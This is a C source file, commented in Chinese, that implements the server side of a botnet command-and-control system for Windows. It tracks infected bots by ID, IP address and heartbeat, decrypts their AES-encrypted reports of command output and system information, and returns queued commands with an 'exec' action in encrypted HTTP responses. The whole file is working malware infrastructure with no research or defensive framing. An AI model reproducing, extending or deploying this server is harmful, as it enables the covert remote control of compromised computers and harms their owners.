#include "c2_server.h"

#define BOT_TIMEOUT_SECONDS 60 // 超过60秒无心跳视为离线

// 在init_bot_manager()中启动清理线程
void init_bot_manager() {
    InitializeCriticalSection(&bot_mutex);
    memset(bot_list, 0, sizeof(bot_list));

    // 为每个Bot槽位分配固定ID
    for (int i = 0; i < MAX_BOTS; i++) {
        bot_list[i].persistent_id = i + 1; // 1-based ID
    }
    
    // 启动定时清理线程
    HANDLE cleaner_thread = (HANDLE)_beginthreadex(
        NULL, 0, bot_cleaner_thread, NULL, 0, NULL
    );
    if (cleaner_thread) {
        CloseHandle(cleaner_thread);
    }
}

// 定时清理线程函数 ?
unsigned __stdcall bot_cleaner_thread(void *arg) {
    while (1) {
        Sleep(10000); // 每10秒检查一次
        
        EnterCriticalSection(&bot_mutex);
        
        time_t now = time(NULL);
        
        for (int i = 0; i < MAX_BOTS; i++) {
            if (bot_list[i].bot_id[0] != '\0' && 
                (now - bot_list[i].last_seen) > BOT_TIMEOUT_SECONDS) {
                
                #ifdef _DEBUG
                printf("[Cleaner] Removing inactive bot: %s (last seen %lds ago)\n", 
                       bot_list[i].bot_id, now - bot_list[i].last_seen);
                #endif
                
                memset(&bot_list[i], 0, sizeof(BotSession));
            }
        }
        
        LeaveCriticalSection(&bot_mutex);
    }
    return 0;
}

void cleanup_bot_manager() {
    DeleteCriticalSection(&bot_mutex);
}

void update_bot_list(const char *bot_id, const char *ip) {
    EnterCriticalSection(&bot_mutex);
    
    int found = -1;
    
    // 第一阶段：查找现有Bot记录
    for (int i = 0; i < MAX_BOTS; i++) {
        if (strcmp(bot_list[i].bot_id, bot_id) == 0) {
            found = i;
            break;
        }
    }
    
    // 第二阶段：查找空闲槽位
    if (found == -1) {
        for (int i = 0; i < MAX_BOTS; i++) {
            if (bot_list[i].bot_id[0] == '\0') {
                found = i;
                break;
            }
        }
    }
    
    if (found != -1) {
        // 仅更新需要变化的字段，保留pending_command 
        strncpy_s(bot_list[found].bot_id, sizeof(bot_list[found].bot_id), 
                 bot_id, _TRUNCATE);
        strncpy_s(bot_list[found].last_ip, sizeof(bot_list[found].last_ip),
                 ip, _TRUNCATE);
        bot_list[found].last_seen = time(NULL);
    }
    
    LeaveCriticalSection(&bot_mutex);
}

char* get_query_param(const char *query, const char *param) {
    if (!query || !param) return NULL;
    
    char *query_copy = _strdup(query);
    if (!query_copy) return NULL;
    
    char *token, *next_token = NULL;
    token = strtok_s(query_copy, "&", &next_token);
    
    while (token) {
        char *key = token;
        char *value = strchr(token, '=');
        if (value) {
            *value = '\0';
            value++;
            
            if (_stricmp(key, param) == 0) {
                char *result = _strdup(value);
                free(query_copy);
                return result;
            }
        }
        token = strtok_s(NULL, "&", &next_token);
    }
    
    free(query_copy);
    return NULL;
}

void handle_report_data(SOCKET client_socket, const char *headers, 
                        const char *body, size_t body_len) {

    // 安全打印头信息（防止乱码）
    #ifdef DEBUG_MODE
    printf("---------- Received Headers (Hex Dump) ----------\n");
    hex_dump(headers, strlen(headers)); // 使用新的hex_dump函数
    printf("\n---------- Header Content ----------\n");
    safe_print(headers); // 安全打印可打印字符
    printf("\n-----------------------------------\n");
    #endif
    
    // 获取Bot ID
    char *bot_id = get_header_value(headers, "X-Bot-ID");
    if (!bot_id) {
        #ifdef DEBUG_MODE
        printf("[WARN] Missing X-Bot-ID header\n");
        #endif
        const char *response = "HTTP/1.1 400 Bad Request\r\n"
                              "Content-Length: 0\r\n"
                              "Connection: close\r\n\r\n";
        send(client_socket, response, (int)strlen(response), 0);
        return;
    }

    if (bot_id) {
         // 获取客户端IP
        struct sockaddr_in client_addr;
        int addr_len = sizeof(client_addr);
        char ip_str[INET_ADDRSTRLEN] = "unknown";
        
        if (getpeername(client_socket, (struct sockaddr*)&client_addr, &addr_len) == 0) {
            inet_ntop(AF_INET, &client_addr.sin_addr, ip_str, INET_ADDRSTRLEN);
        }
        
        // 更新Bot列表
        update_bot_list(bot_id, ip_str);
    }

    if (!bot_id) {
        const char *response = "HTTP/1.1 400 Bad Request\r\n"
                              "Content-Length: 0\r\n"
                              "Connection: close\r\n\r\n";
        send(client_socket, response, (int)strlen(response), 0);
        return;
    }
    
   

    // 解密数据
    size_t decrypted_len = body_len; 
    uint8_t *decrypted = malloc(body_len + 1);  // 多分配1字节
    if (!decrypted) {
        #ifdef DEBUG_MODE
        printf("[ERROR] Memory allocation failed\n");
        #endif
        return;
    }

    // 使用带填充处理的解密函数
    aes_decrypt_padded((uint8_t*)body, decrypted, &decrypted_len, (uint8_t*)global_config->aes_key);
    // 添加解密失败检查
    if (decrypted_len == 0) {
        free(decrypted);
        printf("[ERROR] Decryption failed\n");
        return;
    }
    if (decrypted_len >= body_len) {
        // 错误处理
        free(decrypted);
        printf("[ERROR] decrypted_len >= body_len \n");
        return; 
    }
    // 确保以NULL结尾
      decrypted[decrypted_len] = '\0';

    #ifdef DEBUG_MODE
        printf("[+] Received report (decrypted): ");
        safe_print((char*)decrypted);
        printf("\n");
    #endif

    // 尝试解析JSON
    json_error_t error;
    json_t *root = json_loads((char*)decrypted, 0, &error);
    int has_command = 0;
    char response_json[512] = "{\"status\":\"ack\"}";

    if (root) {
        // 检查是否是命令执行结果
        json_t *type = json_object_get(root, "type");
        json_t *result = json_object_get(root, "result");
        json_t *bot_id_json = json_object_get(root, "bot_id");
        
        if (type && json_is_string(type) && result && json_is_string(result) && bot_id_json) {
            const char *type_str = json_string_value(type);
            const char *result_str = json_string_value(result);
            const char *reporting_bot_id = json_string_value(bot_id_json);
            
            if (strcmp(type_str, "result") == 0) {
                // 处理命令执行结果
                printf("\n[+] [Command Result from %s]\n%s\n", 
                    reporting_bot_id, result_str);
                has_command = 0;
            }
            else if (strcmp(type_str, "info") == 0) {
                // 处理系统信息
                printf("\n[+] [System Info from %s]\n%s\n", 
                    reporting_bot_id, result_str);
                has_command = 0;
            }
            else {
                // 不是结果类型，检查是否有待发送命令
                EnterCriticalSection(&bot_mutex);
                for (int i = 0; i < MAX_BOTS; i++) {
                    if (strcmp(bot_list[i].bot_id, bot_id) == 0 && 
                        bot_list[i].pending_command[0] != '\0') 
                    {
                        snprintf(response_json, sizeof(response_json),
                            "{\"action\":\"exec\",\"command\":\"%s\"}",
                            bot_list[i].pending_command);
                        bot_list[i].pending_command[0] = '\0';
                        has_command = 1;
                        break;
                    }
                }
                LeaveCriticalSection(&bot_mutex);
            }
        }
        else {
            // 不是结果类型，检查是否有待发送命令
            EnterCriticalSection(&bot_mutex);
            for (int i = 0; i < MAX_BOTS; i++) {
                if (strcmp(bot_list[i].bot_id, bot_id) == 0 && 
                    bot_list[i].pending_command[0] != '\0') 
                {
                    snprintf(response_json, sizeof(response_json),
                        "{\"action\":\"exec\",\"command\":\"%s\"}",
                        bot_list[i].pending_command);
                    bot_list[i].pending_command[0] = '\0';
                    has_command = 1;
                    break;
                }
            }
            LeaveCriticalSection(&bot_mutex);
        }
        json_decref(root);
    }
    else {
        // JSON解析失败，检查是否有待发送命令
        EnterCriticalSection(&bot_mutex);
        for (int i = 0; i < MAX_BOTS; i++) {
            if (strcmp(bot_list[i].bot_id, bot_id) == 0 && 
                bot_list[i].pending_command[0] != '\0') 
            {
                snprintf(response_json, sizeof(response_json),
                    "{\"action\":\"exec\",\"command\":\"%s\"}",
                    bot_list[i].pending_command);
                bot_list[i].pending_command[0] = '\0';
                has_command = 1;
                break;
            }
        }
        LeaveCriticalSection(&bot_mutex);
    }

        // 打印调试信息
    #ifdef DEBUG_MODE
        printf("[+] Sending response to bot: %s\n", response_json);
    #endif
    
    // 加密响应
    size_t enc_len = strlen(response_json);
    size_t max_enc_size = enc_len + 16;
    uint8_t* encrypted_response = malloc(max_enc_size);
    if (!encrypted_response) {
        #ifdef DEBUG_MODE
        printf("[ERROR] Memory allocation failed for encryption\n");
        #endif
        return;
    }
    
    aes_encrypt_padded((uint8_t*)response_json, encrypted_response, &enc_len, 
                      (uint8_t*)global_config->aes_key);
    
    // 创建HTTP头
    char response_header[512];
    snprintf(response_header, sizeof(response_header),
        "HTTP/1.1 200 OK\r\n"
        "Content-Type: application/json\r\n"
        "Content-Length: %zu\r\n"
        "Connection: close\r\n\r\n",
        enc_len);
    
    // 使用send_all发送头
    if (send_all(client_socket, response_header, strlen(response_header)) < 0) {
        #ifdef DEBUG_MODE
        printf("[ERROR] Failed to send HTTP headers: %d\n", WSAGetLastError());
        #endif
        free(encrypted_response);
        return;
    }
    
    // 使用send_all发送加密数据
    if (send_all(client_socket, (char*)encrypted_response, enc_len) < 0) {
        #ifdef DEBUG_MODE
        printf("[ERROR] Failed to send encrypted response: %d\n", WSAGetLastError());
        #endif
    } else {
        printf("[CMD] Sent to %s: %s\n", bot_id, response_json);
    }
    
    free(bot_id);
    free(decrypted);
    free(encrypted_response);
}



char *find_body_start(const char *request) {
    // 尝试查找标准的 "\r\n\r\n"
    char *pos = strstr(request, "\r\n\r\n");
    if (pos) return pos + 4;
    
    // 尝试查找可能的变体 "\n\n"
    pos = strstr(request, "\n\n");
    if (pos) return pos + 2;
    
    // 最后尝试查找 "\r\n"
    pos = strstr(request, "\r\n");
    if (pos) return pos + 2;
    
    return NULL;
}



// 查找头部值的直接实现
char *get_header_value(const char *headers, const char *header_name) {
    const char *search_str = header_name;
    const char *ptr = headers;
    size_t name_len = strlen(header_name);
    
    // 跳过请求行
    while (*ptr && *ptr != '\r' && *ptr != '\n') ptr++;
    if (*ptr == '\r') ptr++;
    if (*ptr == '\n') ptr++;
    
    // 遍历所有行
    while (*ptr) {
        // 检查是否匹配头部名称（不区分大小写）
        if (strncasecmp(ptr, search_str, name_len) == 0) {
            const char *colon = ptr + name_len;
            if (*colon == ':') {
                colon++; // 跳过冒号
                
                // 跳过冒号后的空白
                while (*colon == ' ' || *colon == '\t') colon++;
                
                // 找到行尾
                const char *end = colon;
                while (*end && *end != '\r' && *end != '\n') end++;
                
                // 提取值
                size_t value_len = end - colon;
                char *value = malloc(value_len + 1);
                if (!value) return NULL;
                
                memcpy(value, colon, value_len);
                value[value_len] = '\0';
                return value;
            }
        }
        
        // 移动到下一行
        while (*ptr && *ptr != '\r' && *ptr != '\n') ptr++;
        if (*ptr == '\r') ptr++;
        if (*ptr == '\n') ptr++;
    }
    
    return NULL;
}

int get_content_length(const char *headers) {
    #ifdef DEBUG_MODE
    printf("[get_content_length] Searching for Content-Length in headers:\n%s\n", headers);
    #endif
    
    const char *ptr = headers;
    
    // 跳过请求行
    while (*ptr && *ptr != '\r' && *ptr != '\n') ptr++;
    if (*ptr == '\r') ptr++;
    if (*ptr == '\n') ptr++;
    
    // 搜索 "Content-Length:" 字符串
    while (*ptr) {
        #ifdef DEBUG_MODE
        printf("[get_content_length] Checking: %.*s\n", 50, ptr);
        #endif
        
        if (_strnicmp(ptr, "Content-Length:", 15) == 0) {
            ptr += 15; // 跳过 "Content-Length:"
            
            // 跳过空白
            while (*ptr == ' ' || *ptr == '\t') ptr++;
            
            // 转换数字
            char *endptr;
            long len = strtol(ptr, &endptr, 10);
            
            #ifdef DEBUG_MODE
            printf("[get_content_length] Found number: %ld\n", len);
            #endif
            
            // 验证转换
            if (endptr > ptr && (*endptr == '\r' || *endptr == '\n' || *endptr == '\0')) {
                #ifdef DEBUG_MODE
                printf("[get_content_length] Valid Content-Length: %ld\n", len);
                #endif
                return (int)len;
            }
        }
        
        // 移动到下一行
        while (*ptr && *ptr != '\r' && *ptr != '\n') ptr++;
        if (*ptr == '\r') ptr++;
        if (*ptr == '\n') ptr++;
    }
    
    #ifdef DEBUG_MODE
    printf("[get_content_length] Content-Length not found\n");
    #endif
    
    return -1;
}